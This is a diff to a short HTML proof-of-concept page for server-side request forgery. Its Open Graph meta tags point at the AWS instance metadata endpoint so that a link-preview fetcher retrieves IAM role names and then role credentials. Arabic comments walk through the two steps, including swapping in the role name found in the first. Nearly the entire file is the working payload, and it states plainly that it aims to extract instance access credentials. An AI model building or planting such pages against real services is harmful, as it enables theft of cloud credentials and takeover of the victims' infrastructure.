@@ -1,10 +1,18 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>SSRF - IAM Role</title>
-    <meta property="og:image" content="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+    <title>SSRF - IAM Token Access</title>
+
+    <!-- الخطوة 1: محاولة الحصول على اسم الدور -->
+    <meta name="description" content="SSRF to metadata role name">
+    <meta property="og:title" content="IAM Role Check">
+    <meta property="og:description" content="http://169.254.169.254/latest/meta-data/iam/security-credentials/">
+
+    <!-- الخطوة 2: محاولة الحصول على مفاتيح الدور (استبدل YOUR_ROLE بعد التجربة الأولى) -->
+    <meta property="og:image" content="http://169.254.169.254/latest/meta-data/iam/security-credentials/YOUR_ROLE">
   </head>
   <body>
-    <h1>SSRF to get IAM Role</h1>
+    <h1>SSRF to AWS Metadata IAM Credentials</h1>
+    <p>This PoC attempts to extract the instance IAM access credentials.</p>
   </body>
 </html>
